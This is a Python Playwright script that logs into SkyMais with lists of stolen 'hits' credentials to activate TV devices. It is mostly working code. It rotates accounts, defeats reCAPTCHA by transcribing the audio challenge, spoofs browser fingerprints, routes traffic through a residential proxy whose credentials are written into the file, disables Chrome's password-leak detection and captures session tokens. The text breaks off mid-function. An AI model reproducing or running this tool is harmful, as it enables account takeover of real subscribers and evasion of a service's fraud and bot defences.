# -*- coding: utf-8 -*-
"""
=============================================================================
         SKY TV ATIVADOR - AUTOMAÇÃO HEADLESS NAVEGADOR (PLAYWRIGHT)
=============================================================================
Módulo responsável por executar a ativação de TVs simulando um navegador
real (Chromium) com sistema anti-detecção (Stealth) e tratamento inteligente
de login SKY e reCAPTCHA.

Fluxo oficial para contas de clientes SKY:
1. Inicia Chromium com Perfil Isolado por Conta (hits/browser_profile/<email>/) e Stealth.
2. Acessa https://www.skymais.com.br/ativar
3. Se já autenticado, vai direto para o preenchimento do código da TV.
4. Se não autenticado, clica no botão [ SKY ] ("Se você é cliente SKY...").
5. Preenche credenciais do assinante SKY (Email/CPF e Senha) e submete.
6. Trata reCAPTCHA (resolução 100% automática via áudio com Wit.ai / Google STT).
7. Aguarda o login concluir e o redirecionamento de volta para /ativar.
8. Localiza e preenche o código de 6 dígitos da TV na tela oficial de ativação.
9. Clica em Ativar e confirma o sucesso da vinculação.
=============================================================================
"""

import os
import sys
import re
import json
import time
import glob
import tempfile
import base64
from typing import Optional, Dict, Any, Tuple, List

# Diretórios
BASE_DIR = os.path.dirname(os.path.abspath(__file__))
HITS_DIR = os.path.join(BASE_DIR, "hits")
SESSIONS_DIR = os.path.join(HITS_DIR, "browser_sessions")
SCREENSHOTS_DIR = os.path.join(HITS_DIR, "screenshots")
PROFILE_DIR = os.path.join(HITS_DIR, "browser_profile")
ACTIVATED_FILE = os.path.join(HITS_DIR, "contas_ativadas.txt")
INVALID_FILE = os.path.join(HITS_DIR, "contas_invalidas.txt")
LOG_ATIVACAO_FILE = os.path.join(HITS_DIR, "ativacoes_tv.txt")

os.makedirs(SESSIONS_DIR, exist_ok=True)
os.makedirs(SCREENSHOTS_DIR, exist_ok=True)
os.makedirs(PROFILE_DIR, exist_ok=True)

URL_ATIVAR = "https://www.skymais.com.br/ativar"

# Configuração de Proxy Residencial Rotativo (DataImpulse)
PROXY_USER = os.environ.get("PROXY_USER", "1a1a873f76905f764786")
PROXY_PASS = os.environ.get("PROXY_PASS", "01e103487dc83ae7")
PROXY_HOST = os.environ.get("PROXY_HOST", "gw.dataimpulse.com")
PROXY_PORT = os.environ.get("PROXY_PORT", "823")

def obter_proxy_dict() -> Optional[Dict[str, str]]:
    if PROXY_HOST and PROXY_PORT:
        user = PROXY_USER
        # Garante IPs residenciais exclusivamente do Brasil (Sky+ bloqueia conexões estrangeiras)
        if "__cr." not in user:
            user = f"{user}__cr.br"
        return {
            "server": f"http://{PROXY_HOST}:{PROXY_PORT}",
            "username": user,
            "password": PROXY_PASS
        }
    return None

def sanitizar_nome_arquivo(nome: str) -> str:
    return re.sub(r'[^a-zA-Z0-9_\-]', '_', nome.strip().lower())

def obter_caminho_sessao(email: str) -> str:
    nome = sanitizar_nome_arquivo(email)
    return os.path.join(SESSIONS_DIR, f"{nome}.json")

def verificar_playwright_instalado() -> Tuple[bool, str]:
    try:
        from playwright.sync_api import sync_playwright
        return True, "Playwright OK"
    except ImportError:
        return False, "Playwright não instalado. Execute instalar_playwright.bat ou 'pip install playwright && python -m playwright install chromium'."
    except Exception as e:
        return False, str(e)


# =============================================================================
# CARREGAMENTO AUTOMÁTICO DE CONTAS DA PASTA HITS & ROTAÇÃO
# =============================================================================

def obter_contas_invalidas() -> set:
    """Retorna conjunto de emails conhecidos com senha errada/invalida para não perder tempo."""
    inv = set()
    if os.path.exists(INVALID_FILE):
        try:
            with open(INVALID_FILE, "r", encoding="utf-8", errors="ignore") as f:
                for line in f:
                    line = line.strip()
                    if line:
                        acc = line.split("|")[0].split(":")[0].strip().lower()
                        if acc:
                            inv.add(acc)
        except Exception:
            pass
    return inv

def registrar_conta_invalida(email: str, motivo: str = "Credenciais incorretas"):
    """Registra conta com falha de credenciais para nunca mais tentar e acelerar as próximas ativações."""
    import datetime
    now_str = datetime.datetime.now().strftime("%d/%m/%Y %H:%M:%S")
    line = f"{email} | {motivo} | {now_str}\n"
    try:
        with open(INVALID_FILE, "a", encoding="utf-8", errors="replace") as f:
            f.write(line)
    except Exception:
        pass

def obter_contagem_ativacoes() -> Dict[str, int]:
    """Retorna dict {email_lower: quantidade_de_ativacoes} lendo contas_ativadas.txt."""
    counts = {}
    if os.path.exists(ACTIVATED_FILE):
        try:
            with open(ACTIVATED_FILE, "r", encoding="utf-8", errors="ignore") as f:
                for line in f:
                    line = line.strip()
                    if ":" in line and "|" in line:
                        acc = line.split("|")[0].strip()
                        em = acc.split(":")[0].strip().lower()
                        counts[em] = counts.get(em, 0) + 1
        except Exception:
            pass
    return counts

def registrar_conta_ativada(email: str, password: str, tv_code: str):
    """Registra conta utilizada com sucesso no histórico."""
    import datetime
    now_str = datetime.datetime.now().strftime("%d/%m/%Y %H:%M:%S")
    line = f"{email}:{password} | TV: {tv_code} | {now_str}\n"
    try:
        with open(ACTIVATED_FILE, "a", encoding="utf-8", errors="replace") as f:
            f.write(line)
    except Exception:
        pass

def carregar_contas_hits() -> List[Tuple[str, str]]:
    """
    Carrega automaticamente todas as contas válidas da pasta hits/
    (COMPLETAS.txt, MEDIA.txt, BASICA.txt, Todos_Hits.txt, raw_json/ e skycontas.txt)
    e ordena priorizando as que têm menos ativações (ou nunca foram usadas).
    Filtra e ignora automaticamente contas com senhas inválidas salvas em contas_invalidas.txt.
    """
    contas: List[Tuple[str, str]] = []
    vistos = set()
    invalidas = obter_contas_invalidas()

    def parse_hit_content(texto: str):
        for block in re.split(r"╔═══", texto):
            m = re.search(r"Login:\s*([^\s:]+):([^\s\r\n]+)", block)
            if m:
                em = m.group(1).strip()
                pw = m.group(2).strip()
                em_lower = em.lower()
                if em and pw and em_lower not in vistos and em_lower not in invalidas:
                    vistos.add(em_lower)
                    contas.append((em, pw))

    # 1. Arquivos da pasta hits/
    arquivos_hits = ["COMPLETAS.txt", "MEDIA.txt", "BASICA.txt", "Todos_Hits.txt"]
    for fname in arquivos_hits:
        fpath = os.path.join(HITS_DIR, fname)
        if os.path.exists(fpath):
            try:
                with open(fpath, "r", encoding="utf-8", errors="ignore") as f:
                    parse_hit_content(f.read())
            except Exception:
                pass

    # 2. Pasta raw_json/
    raw_dir = os.path.join(HITS_DIR, "raw_json")
    if os.path.exists(raw_dir):
        for jname in os.listdir(raw_dir):
            if jname.endswith(".json"):
                jpath = os.path.join(raw_dir, jname)
                try:
                    with open(jpath, "r", encoding="utf-8", errors="ignore") as jf:
                        d = json.load(jf)
                        em = d.get("email", "")
                        pw = d.get("password", "")
                        em_lower = em.lower()
                        if em and pw and em_lower not in vistos and em_lower not in invalidas:
                            vistos.add(em_lower)
                            contas.append((em, pw))
                except Exception:
                    pass

    # 3. skycontas.txt
    skycontas_path = os.path.join(BASE_DIR, "skycontas.txt")
    if os.path.exists(skycontas_path):
        try:
            with open(skycontas_path, "r", encoding="utf-8", errors="ignore") as sf:
                for line in sf:
                    line = line.strip()
                    if ":" in line:
                        parts = line.split(":", 1)
                        em, pw = parts[0].strip(), parts[1].strip()
                        em_lower = em.lower()
                        if em and pw and em_lower not in vistos and em_lower not in invalidas:
                            vistos.add(em_lower)
                            contas.append((em, pw))
        except Exception:
            pass

    # Ordena por menor número de ativações prévias
    counts = obter_contagem_ativacoes()
    contas.sort(key=lambda acc: counts.get(acc[0].strip().lower(), 0))
    return contas


# =============================================================================
# STEALTH & RESOLUÇÃO DE CAPTCHA
# =============================================================================

def aplicar_stealth(page):
    """Aplica proteções anti-detecção no navegador para contornar reCAPTCHA."""
    try:
        from playwright_stealth import stealth_sync
        stealth_sync(page)
    except Exception:
        pass

    try:
        page.add_init_script("""
            Object.defineProperty(navigator, 'webdriver', {
                get: () => undefined
            });

            Object.defineProperty(navigator, 'plugins', {
                get: () => [
                    { name: 'Chrome PDF Plugin', filename: 'internal-pdf-viewer' },
                    { name: 'Chrome PDF Viewer', filename: 'mhjfbmdgcfjbbpaeojofohoefgiehjai' },
                    { name: 'Native Client', filename: 'internal-nacl-plugin' }
                ]
            });

            Object.defineProperty(navigator, 'languages', {
                get: () => ['pt-BR', 'pt', 'en-US', 'en']
            });

            window.chrome = {
                app: { isInstalled: false },
                webstore: { onInstallStageChanged: {}, onDownloadProgress: {} },
                runtime: {
                    PlatformOs: { MAC: 'mac', WIN: 'win', ANDROID: 'android', CROS: 'cros', LINUX: 'linux', OPENBSD: 'openbsd' },
                    PlatformArch: { ARM: 'arm', X86_32: 'x86-32', X86_64: 'x86-64' },
                    PlatformNaclArch: { ARM: 'arm', X86_32: 'x86-32', X86_64: 'x86-64' }
                }
            };
        """)
    except Exception:
        pass


def converter_audio_url_para_wav(page, audio_url: str) -> Optional[bytes]:
    """
    Utiliza o motor Web Audio do Chromium (via Playwright) para decodificar MP3
    e converter diretamente em PCM WAV 16-bit, sem depender de ffmpeg ou ferramentas externas.
    """
    js_decoder = """
    async (url) => {
        try {
            const resp = await fetch(url);
            const arrayBuffer = await resp.arrayBuffer();
            const AudioCtx = window.AudioContext || window.webkitAudioContext;
            const ctx = new AudioCtx({ sampleRate: 16000 });
            const audioBuffer = await ctx.decodeAudioData(arrayBuffer);
            
            const numChannels = 1;
            const sampleRate = audioBuffer.sampleRate;
            const pcmData = audioBuffer.getChannelData(0);
            const wavBuffer = new ArrayBuffer(44 + pcmData.length * 2);
            const view = new DataView(wavBuffer);
            
            function writeString(offset, str) {
                for (let i = 0; i < str.length; i++) {
                    view.setUint8(offset + i, str.charCodeAt(i));
                }
            }
            
            writeString(0, 'RIFF');
            view.setUint32(4, 36 + pcmData.length * 2, true);
            writeString(8, 'WAVE');
            writeString(12, 'fmt ');
            view.setUint32(16, 16, true);
            view.setUint16(20, 1, true); // PCM
            view.setUint16(22, numChannels, true);
            view.setUint32(24, sampleRate, true);
            view.setUint32(28, sampleRate * numChannels * 2, true);
            view.setUint16(32, numChannels * 2, true);
            view.setUint16(34, 16, true); // 16 bits por amostra
            writeString(36, 'data');
            view.setUint32(40, pcmData.length * 2, true);
            
            let offset = 44;
            for (let i = 0; i < pcmData.length; i++, offset += 2) {
                let s = Math.max(-1, Math.min(1, pcmData[i]));
                view.setInt16(offset, s < 0 ? s * 0x8000 : s * 0x7FFF, true);
            }
            
            let binary = '';
            const bytes = new Uint8Array(wavBuffer);
            const chunkSize = 0x8000;
            for (let i = 0; i < bytes.length; i += chunkSize) {
                binary += String.fromCharCode.apply(null, bytes.subarray(i, i + chunkSize));
            }
            return btoa(binary);
        } catch(e) {
            return null;
        }
    }
    """
    try:
        wav_b64 = page.evaluate(js_decoder, audio_url)
        if wav_b64:
            import base64
            return base64.b64decode(wav_b64)
    except Exception as e:
        print(f"[*] [reCAPTCHA] Conversão de áudio via navegador: {e}")
    return None


def transcrever_audio_wav(wav_path: str) -> Optional[str]:
    """
    Transcreve arquivo WAV utilizando Google Speech Recognition diretamente.
    """
    try:
        import speech_recognition as sr
        r = sr.Recognizer()
        with sr.AudioFile(wav_path) as source:
            audio = r.record(source)

        for lang in ["pt-BR", "en-US", "es-ES"]:
            try:
                text = r.recognize_google(audio, language=lang)
                if text and len(text.strip()) > 0:
                    print(f"[✓] [reCAPTCHA] Áudio transcrito com sucesso ({lang}): '{text}'")
                    return text.strip()
            except Exception:
                continue
    except Exception as e:
        print(f"[!] [reCAPTCHA] Erro no SpeechRecognition: {e}")

    return None


def resolver_recaptcha_se_existir(page, max_wait_sec: int = 40) -> bool:
    """
    Verifica se o desafio do reCAPTCHA está aberto e resolve 100% automaticamente
    via desafio de áudio (fone 🎧) com transcrição contínua para quantas rodadas o Google exigir
    (ex: 'São necessárias várias soluções corretas. Solucione mais.').
    """
    try:
        bframe = None
        for f in page.frames:
            if "recaptcha" in f.url and "bframe" in f.url:
                bframe = f
                break

        if not bframe:
            return True

        print("[*] [reCAPTCHA] Desafio detectado! Tentando resolver automaticamente via áudio (🎧)...")
        
        # Clica no botão de áudio se ainda não estiver na tela de áudio
        try:
            audio_btn = bframe.locator("#recaptcha-audio-button")
            if audio_btn.count() > 0 and audio_btn.first.is_visible():
                audio_btn.first.click(force=True, timeout=4000)
                time.sleep(2)
        except Exception:
            pass

        # Executa até 4 rodadas se o Google pedir "São necessárias várias soluções corretas"
        url_anterior = None
        for rodada in range(1, 5):
            # Se o navegador já redirecionou após o login com sucesso
            if "vrioservices" not in page.url.lower():
                return True

            erro_audio = bframe.locator(".rc-doscaptcha-body-text, .rc-audiochallenge-error-message")
            if erro_audio.count() > 0 and erro_audio.first.is_visible():
                txt_erro = erro_audio.first.inner_text().strip()
                if "bloque" in txt_erro.lower() or "tente mais tarde" in txt_erro.lower():
                    print(f"[!] [reCAPTCHA] Google bloqueou desafio de áudio: '{txt_erro}'")
                    break

            audio_source = bframe.locator("#audio-source")
            if audio_source.count() == 0 or not audio_source.first.is_visible():
                # Tenta aguardar o elemento de áudio
                try:
                    bframe.wait_for_selector("#audio-source", timeout=4000)
                except Exception:
                    pass
                audio_source = bframe.locator("#audio-source")

            if audio_source.count() > 0:
                audio_url = audio_source.get_attribute("src")
                if audio_url:
                    if rodada > 1:
                        print(f"[*] [reCAPTCHA] Rodada {rodada}: resolvendo desafio de áudio adicional...")
                    else:
                        print("[*] [reCAPTCHA] Baixando e decodificando áudio no navegador...")

                    url_anterior = audio_url

                    # Decodifica usando o Web Audio do próprio navegador
                    wav_bytes = converter_audio_url_para_wav(bframe, audio_url)
                    if not wav_bytes:
                        wav_bytes = converter_audio_url_para_wav(page, audio_url)

                    texto_transcrito = None
                    if wav_bytes:
                        with tempfile.NamedTemporaryFile(suffix=".wav", delete=False) as tmp_wav:
                            tmp_wav.write(wav_bytes)
                            wav_file = tmp_wav.name

                        try:
                            texto_transcrito = transcrever_audio_wav(wav_file)
                        finally:
                            try:
                                os.remove(wav_file)
                            except Exception:
                                pass

                    if texto_transcrito:
                        resp_in = bframe.locator("#audio-response")
                        if resp_in.count() > 0:
                            resp_in.first.fill(texto_transcrito)
                            time.sleep(0.3)
                            verify_btn = bframe.locator("#recaptcha-verify-button")
                            if verify_btn.count() > 0:
                                verify_btn.first.click(force=True)
                                print(f"[✓] [reCAPTCHA] Resposta da rodada {rodada} enviada: '{texto_transcrito}'")
                                time.sleep(1.8)
                    else:
                        print(f"[!] [reCAPTCHA] Não foi possível transcrever o áudio na rodada {rodada}.")
                        # Clica no botão de recarregar áudio se falhou a transcrição
                        reload_btn = bframe.locator("#recaptcha-reload-button")
                        if reload_btn.count() > 0 and reload_btn.first.is_visible():
                            reload_btn.first.click(force=True)
                            time.sleep(1.2)
                            continue

            # Verifica se já foi validado ou se ainda exige mais soluções
            time.sleep(1.5)
            if "vrioservices" not in page.url.lower():
                return True

            desafio_aberto = False
            for f in page.frames:
                if "recaptcha" in f.url and "bframe" in f.url:
                    try:
                        if f.locator("#rc-imageselect").is_visible() or f.locator(".rc-audiochallenge-control").is_visible():
                            desafio_aberto = True
                            break
                    except Exception:
                        pass

            if not desafio_aberto:
                print("[✓] [reCAPTCHA] Desafio reCAPTCHA resolvido e aprovado com sucesso!")
                return True

        # Aguarda confirmação final de fechamento ou redirecionamento
        print(f"[*] [reCAPTCHA] Aguardando confirmação final do login...")
        for _ in range(max_wait_sec):
            time.sleep(1)
            if "vrioservices" not in page.url.lower():
                return True

            aberto = False
            for f in page.frames:
                if "recaptcha" in f.url and "bframe" in f.url:
                    try:
                        if f.locator("#rc-imageselect").is_visible() or f.locator(".rc-audiochallenge-control").is_visible():
                            aberto = True
                            break
                    except Exception:
                        pass
            if not aberto:
                print("[✓] [reCAPTCHA] Desafio reCAPTCHA concluído com sucesso!")
                return True

    except Exception as e:
        print(f"[!] [reCAPTCHA] Observação: {e}")

    return False


def esta_na_tela_de_login(page) -> bool:
    """Verifica se a página atual é um formulário de login (não a tela de TV)."""
    url = page.url.lower()
    if "vrioservices" in url or "auth.sky" in url or "minha-sky" in url:
        return True
    try:
        if page.locator("input[type='password']").count() > 0:
            for i in range(page.locator("input[type='password']").count()):
                if page.locator("input[type='password']").nth(i).is_visible():
                    return True
        conteudo = page.content().lower()
        if "entre com sua conta sky" in conteudo:
            return True
        if "se você é cliente sky" in conteudo:
            return True
    except Exception:
        pass
    return False


def clicar_botao_ativar(target) -> bool:
    """Clica no botão de confirmação da ativação (PRONTO!, Ativar, etc)."""
    btn_selectors = [
        "button:has-text('PRONTO')",
        "button:has-text('Pronto')",
        "button:text-is('PRONTO!')",
        "button:text-is('PRONTO')",
        "button:has-text('Ativar')",
        "button:has-text('Confirmar')",
        "button:has-text('Continuar')",
        "button:has-text('Vincular')",
        "button:has-text('Enviar')",
        "button[type='submit']",
        "button.btn-primary",
        "button.primary"
    ]
    for sel in btn_selectors:
        try:
            btn = target.locator(sel)
            if btn.count() > 0 and btn.first.is_visible():
                print(f"[*] [Playwright] Clicando no botão de ativação ({sel})...")
                for _ in range(8):
                    if btn.first.is_enabled():
                        break
                    time.sleep(0.2)
                btn.first.click(force=True, timeout=3000)
                return True
        except Exception:
            pass

    try:
        target.keyboard.press("Enter")
        print("[*] [Playwright] Tecla Enter pressionada no campo de código.")
        return True
    except Exception:
        pass
    return False


def fechar_popups_bloqueantes(page):
    """Fecha avisos e popups do navegador ou da página que possam cobrir o campo da TV."""
    try:
        page.keyboard.press("Escape")
        time.sleep(0.1)

        # Procura qualquer botão OK ou Entendi na tela (ex: 'Mude sua senha')
        botoes_ok = page.locator("button:has-text('OK'), button:has-text('Ok'), button:text-is('OK'), button:has-text('Entendi'), button:has-text('Fechar'), [role='dialog'] button")
        if botoes_ok.count() > 0:
            for idx in range(botoes_ok.count()):
                try:
                    if botoes_ok.nth(idx).is_visible():
                        botoes_ok.nth(idx).click(force=True, timeout=1000)
                        time.sleep(0.2)
                except Exception:
                    pass

        # Remove qualquer backdrop ou modal cinza/branco via script
        page.evaluate("""() => {
            document.querySelectorAll('[role="dialog"], .modal, .popup, .overlay, [class*="dialog"]').forEach(el => {
                const btn = el.querySelector('button');
                if (btn) btn.click();
            });
        }""")
    except Exception:
        pass


def desativar_gerenciador_senhas_perfil(profile_dir: str):
    """Desativa completamente o verificador de vazamento de senhas, salvar senhas e traduções no perfil do Chrome."""
    try:
        default_dir = os.path.join(profile_dir, "Default")
        os.makedirs(default_dir, exist_ok=True)
        pref_file = os.path.join(default_dir, "Preferences")
        prefs = {}
        if os.path.exists(pref_file):
            try:
                with open(pref_file, "r", encoding="utf-8") as f:
                    prefs = json.load(f)
            except Exception:
                prefs = {}
        
        prefs.setdefault("profile", {})["password_manager_enabled"] = False
        prefs.setdefault("profile", {})["password_manager_leak_detection"] = False
        prefs.setdefault("profile", {})["leak_detection_enabled"] = False
        prefs["credentials_enable_service"] = False
        prefs.setdefault("password_manager", {})["leak_detection"] = False
        prefs.setdefault("password_manager", {})["leak_detection_enabled"] = False
        prefs.setdefault("password_manager", {})["enabled"] = False
        prefs.setdefault("password_manager", {})["profile_store_date_last_compromised_credentials_leak_checked"] = 0
        prefs.setdefault("autofill", {})["profile_enabled"] = False
        prefs.setdefault("autofill", {})["credit_card_enabled"] = False
        prefs.setdefault("translate", {})["enabled"] = False
        prefs.setdefault("translate_blocked_languages", ["es", "en", "pt"])

        with open(pref_file, "w", encoding="utf-8") as f:
            json.dump(prefs, f, indent=2)
    except Exception:
        pass


def preencher_codigo_tv(page, tv_code: str) -> bool:
    """
    Localiza o campo para digitar o código de 6 dígitos da TV na tela oficial,
    preenche o código com eventos reais de teclado e clica no botão PRONTO!.
    """
    tv_code = str(tv_code).strip().upper()

    # Fecha popups que possam estar cobrindo o campo (ex: 'Mude sua senha')
    fechar_popups_bloqueantes(page)

    # NUNCA preencher em tela de login
    if esta_na_tela_de_login(page):
        return False

    # 0. Preenchimento e clique direto no DOM via JavaScript (imune a qualquer popup flutuante do Chrome)
    try:
        js_injector = """
        (code) => {
            const sels = [
                "input[placeholder*='ativação' i]",
                "input[placeholder*='ativacao' i]",
                "input[placeholder*='código' i]",
                "input[placeholder*='codigo' i]",
                "input[maxlength='6']",
                ".activation-code-input",
                "input.code-input",
                "input[type='text']",
                "input"
            ];
            let input = null;
            for (const s of sels) {
                const el = document.querySelector(s);
                if (el && el.offsetParent !== null) {
                    input = el;
                    break;
                }
            }
            if (input) {
                input.focus();
                const nativeSetter = Object.getOwnPropertyDescriptor(window.HTMLInputElement.prototype, "value")?.set;
                if (nativeSetter) {
                    nativeSetter.call(input, code);
                } else {
                    input.value = code;
                }
                input.dispatchEvent(new Event('input', { bubbles: true }));
                input.dispatchEvent(new Event('change', { bubbles: true }));
                input.dispatchEvent(new KeyboardEvent('keyup', { bubbles: true }));

                const btns = Array.from(document.querySelectorAll("button"));
                const btnPronto = btns.find(b => b.innerText && (
                    b.innerText.toUpperCase().includes("PRONTO") || 
                    b.innerText.toUpperCase().includes("ATIVAR") || 
                    b.innerText.toUpperCase().includes("CONFIRMAR")
                ));
                if (btnPronto) {
                    btnPronto.removeAttribute("disabled");
                    btnPronto.click();
                    return true;
                }
            }
            return false;
        }
        """
        if page.evaluate(js_injector, tv_code):
            print("[*] [Playwright] Código preenchido e botão PRONTO! acionado via DOM!")
            time.sleep(0.4)
            page.keyboard.press("Enter")
            return True
    except Exception:
        pass

    # 1. Caixas individuais (6 dígitos separados)
    caixas_individuais = page.locator("input[maxlength='1']")
    if caixas_individuais.count() == 6:
        print("[*] [Playwright] Detectadas 6 caixas de código individuais.")
        for idx in range(6):
            caixa = caixas_individuais.nth(idx)
            caixa.click()
            caixa.fill(tv_code[idx])
            time.sleep(0.08)
        clicar_botao_ativar(page)
        return True

    # 2. Campo único no documento principal (apenas seletores específicos de TV)
    code_selectors = [
        "input[placeholder*='ativação' i]",
        "input[placeholder*='ativacao' i]",
        "input[placeholder*='código' i]",
        "input[placeholder*='codigo' i]",
        "input[maxlength='6']",
        "input[name*='code' i]",
        "input[name*='codigo' i]",
        "input[id*='code' i]",
        "input[id*='codigo' i]",
        "input[aria-label*='código' i]",
        "input[aria-label*='codigo' i]",
        "[data-testid*='code' i]",
        "input[placeholder*='ex:' i]",
        "input[placeholder*='insira o código' i]",
        "input[placeholder*='digite o código' i]",
        "input[placeholder*='digite o codigo' i]",
        ".activation-code-input",
        "input.code-input"
    ]

    for sel in code_selectors:
        try:
            loc = page.locator(sel)
            if loc.count() > 0 and loc.first.is_visible():
                input_name = (loc.first.get_attribute("name") or "").lower()
                input_type = (loc.first.get_attribute("type") or "").lower()
                if input_name in ["username", "login", "email", "password", "senha", "search", "q"]:
                    continue
                if input_type in ["email", "password"]:
                    continue

                print(f"[*] [Playwright] Campo de código da TV localizado via: {sel}")
                loc.first.click()
                loc.first.fill("")
                # Digitação com delay dispara eventos reais de input do React
                loc.first.type(tv_code, delay=35)
                time.sleep(0.3)
                try:
                    loc.first.evaluate("el => el.dispatchEvent(new Event('input', { bubbles: true }))")
                    loc.first.evaluate("el => el.dispatchEvent(new Event('change', { bubbles: true }))")
                except Exception:
                    pass
                time.sleep(0.3)
                clicar_botao_ativar(page)
                loc.first.press("Enter")
                return True
        except Exception:
            pass

    # 3. Varredura dentro de frames (se houver)
    for frame in page.frames:
        if frame == page.main_frame:
            continue
        for sel in code_selectors:
            try:
                loc = frame.locator(sel)
                if loc.count() > 0 and loc.first.is_visible():
                    input_name = (loc.first.get_attribute("name") or "").lower()
                    if input_name in ["username", "login", "email", "password", "senha"]:
                        continue
                    print(f"[*] [Playwright] Campo de código localizado no frame via: {sel}")
                    loc.first.click()
                    loc.first.fill("")
                    loc.first.type(tv_code, delay=35)
                    time.sleep(0.3)
                    clicar_botao_ativar(frame)
                    loc.first.press("Enter")
                    return True
            except Exception:
                pass

    return False


# =============================================================================
# FUNÇÃO PRINCIPAL DE ATIVAÇÃO
# =============================================================================

def ativar_tv_playwright(
    email: str,
    password: str,
    tv_code: str,
    headless: bool = True,
    timeout_ms: int = 55000,
    usar_proxy: bool = False
) -> Dict[str, Any]:
    """
    Executa a ativação da TV no SkyMais via Playwright Chromium,
    utilizando a autenticação de CLIENTE SKY (botão SKY) com Stealth, perfil isolado e proxy opcional.
    """
    inicio = time.time()
    tv_code = str(tv_code).strip().upper()
    email = str(email).strip()
    password = str(password).strip()

    ok, err_msg = verificar_playwright_instalado()
    if not ok:
        return {
            "success": False,
            "message": f"Erro de dependência: {err_msg}",
            "conta": email,
            "code": tv_code,
            "status": 500,
            "screenshot": None,
            "tempo_segundos": round(time.time() - inicio, 2)
        }

    from playwright.sync_api import sync_playwright

    session_file = obter_caminho_sessao(email)
    tokens_capturados = {}
    screenshot_path = None

    try:
        with sync_playwright() as p:
            args = [
                "--disable-blink-features=AutomationControlled",
                "--no-sandbox",
                "--disable-setuid-sandbox",
                "--disable-infobars",
                "--window-size=1280,850",
                "--disable-dev-shm-usage",
                "--no-first-run",
                "--no-default-browser-check",
                "--password-store=basic",
                "--disable-features=PasswordLeakDetection,AutofillServerCommunication,PasswordGeneration,SavePasswordBubble,PasswordManagerUI,PasswordCheck,Translate",
                "--disable-save-password-bubble",
                "--disable-translate"
            ]

            conta_profile_dir = os.path.join(PROFILE_DIR, sanitizar_nome_arquivo(email))
            os.makedirs(conta_profile_dir, exist_ok=True)
            desativar_gerenciador_senhas_perfil(conta_profile_dir)

            proxy_cfg = obter_proxy_dict() if usar_proxy else None
            if proxy_cfg:
                print(f"[*] [Proxy] Conectando via Proxy DataImpulse ({PROXY_HOST}:{PROXY_PORT})...")

            context = p.chromium.launch_persistent_context(
                user_data_dir=conta_profile_dir,
                headless=headless,
                ignore_default_args=["--enable-automation"],
                args=args,
                proxy=proxy_cfg,
                viewport={"width": 1280, "height": 850},
                user_agent="Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/124.0.0.0 Safari/537.36",
                locale="pt-BR",
                timezone_id="America/Sao_Paulo"
            )

            # Reutiliza cookies e localStorage da conta específica se existir e tiver sessão válida
            s_data = None
            if os.path.exists(session_file) and os.path.getsize(session_file) > 100:
                try:
                    with open(session_file, "r", encoding="utf-8") as sf:
                        s_data = json.load(sf)
                        cookies = s_data.get("cookies", [])
                        if cookies:
                            context.add_cookies(cookies)
                            print(f"[*] [Playwright] {len(cookies)} cookies restaurados para {email}")
                except Exception:
                    pass

            page = context.pages[0] if context.pages else context.new_page()
            page.set_default_timeout(timeout_ms)
            aplicar_stealth(page)

            # Restaura localStorage de SkyMais antes do carregamento da página
            if s_data and "origins" in s_data:
                for origin in s_data["origins"]:
                    if "skymais.com.br" in origin.get("origin", ""):
                        ls_items = origin.get("localStorage", [])
                        if ls_items:
                            setters = []
                            for item in ls_items:
                                k_json = json.dumps(item["name"])
                                v_json = json.dumps(item["value"])
                                setters.append(f"try {{ localStorage.setItem({k_json}, {v_json}); }} catch(e) {{}}")
                            script_str = "() => {\n  " + "\n  ".join(setters) + "\n}"
                            try:
                                page.add_init_script(script_str)
                                print(f"[*] [Playwright] {len(ls_items)} itens de sessão restaurados no localStorage.")
                            except Exception:
                                pass

            ativacao_confirmada_via_api = [False]

            def interceptar_resposta(response):
                try:
                    url = response.url.lower()
                    if any(k in url for k in ["activate", "ativar", "device", "pairing", "pair", "smarttv", "pin", "verify"]):
                        if response.status in [200, 201, 204]:
                            ativacao_confirmada_via_api[0] = True
                    if any(k in url for k in ["oauth2", "token", "activation", "authenticate", "assert"]):
                        content_type = response.headers.get("content-type", "")
                        if "json" in content_type:
                            data = response.json()
                            if isinstance(data, dict):
                                for chave in ["ssoToken", "ssotoken", "idToken", "id_token", "jwt_token", "accessToken"]:
                                    val = data.get(chave)
                                    if val and isinstance(val, str) and val.startswith("ey"):
                                        tokens_capturados[chave] = val
                except Exception:
                    pass

            page.on("response", interceptar_resposta)

            # ── 1. ACESSA A PÁGINA DE ATIVAÇÃO ───────────────────────────
            print(f"[*] [Playwright] Acessando {URL_ATIVAR}...")
            page.goto(URL_ATIVAR, wait_until="domcontentloaded", timeout=timeout_ms)

            # Aguarda dinamicamente a página carregar
            for _ in range(20):
                if page.locator("input[placeholder*='ativação' i], input[placeholder*='código' i], input[maxlength='6'], button:has-text('SKY'), input[name='username']").count() > 0:
                    break
                time.sleep(0.1)

            # Fecha banner de cookies se existir
            try:
                cookie_btn = page.locator("button:has-text('Aceitar'), button:has-text('Concordar'), button:has-text('Entendi'), #onetrust-accept-btn-handler")
                if cookie_btn.count() > 0 and cookie_btn.first.is_visible():
                    cookie_btn.first.click(timeout=1000)
            except Exception:
                pass

            # ── 2. AGUARDA RENDERIZAÇÃO DA PÁGINA E VERIFICA SE JÁ ESTÁ AUTENTICADO ───
            for _ in range(12):
                if esta_na_tela_de_login(page):
                    break
                if page.locator("input[placeholder*='ativação' i], input[placeholder*='código' i]").count() > 0:
                    break
                if page.locator("button:has-text('SKY'), button:has(img[alt*='SKY' i])").count() > 0:
                    break
                time.sleep(0.5)

            esta_logado = not esta_na_tela_de_login(page)

            # Se não detectou botões nem campos (tela em branco), não assumir logado
            if esta_logado and page.locator("input[placeholder*='ativação' i], input[placeholder*='código' i]").count() == 0:
                esta_logado = False

            if not esta_logado:
                print(f"[*] [Playwright] Selecionando provedor [ SKY ] para conta: {email}...")

                clicou_sky = False
                sky_selectors = [
                    "//div[contains(., 'cliente SKY') or contains(., 'cliente sky')]//button[contains(., 'SKY') or contains(., 'Sky')]",
                    "//div[contains(., 'cliente SKY') or contains(., 'cliente sky')]/following::button[1]",
                    "button:has-text('SKY')",
                    "button:has(img[alt*='SKY' i])",
                    "button:has(svg[aria-label*='SKY' i])",
                    "a:has-text('SKY')",
                    "a:has(img[alt*='SKY' i])",
                    "button:text-is('SKY')",
                    "[aria-label*='SKY' i]",
                    "button.sky-button",
                    "[data-testid*='sky' i]"
                ]

                for sel in sky_selectors:
                    try:
                        loc = page.locator(sel)
                        if loc.count() > 0 and loc.first.is_visible():
